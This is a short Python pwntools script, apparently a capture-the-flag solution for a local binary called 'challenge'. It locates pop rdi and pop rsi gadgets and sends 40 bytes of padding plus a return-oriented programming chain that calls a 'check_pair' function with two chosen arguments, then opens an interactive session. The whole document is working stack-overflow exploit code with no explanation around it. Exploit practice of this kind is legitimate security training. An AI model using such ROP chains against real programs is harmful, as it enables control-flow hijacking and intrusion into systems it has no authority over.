from pwn import *

elf = ELF("./challenge")
rop = ROP(elf)

def start():
    if args.GDB:
        return gdb.debug("./challenge")
    else:
        return process(elf.path)
p = start()
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
check_pair = elf.symbols['check_pair']
log.info(f"[*]pop_rdi = {hex(pop_rdi)}")
log.info(f"[*]pop_rsi = {hex(pop_rsi)}")

p.sendafter(b"send your input:\n", b"A"*40 + p64(pop_rdi) + p64(0x1111222233334444) + p64(pop_rsi) + p64(0xAAAABBBBCCCCDDDD) + p64(check_pair))
p.interactive()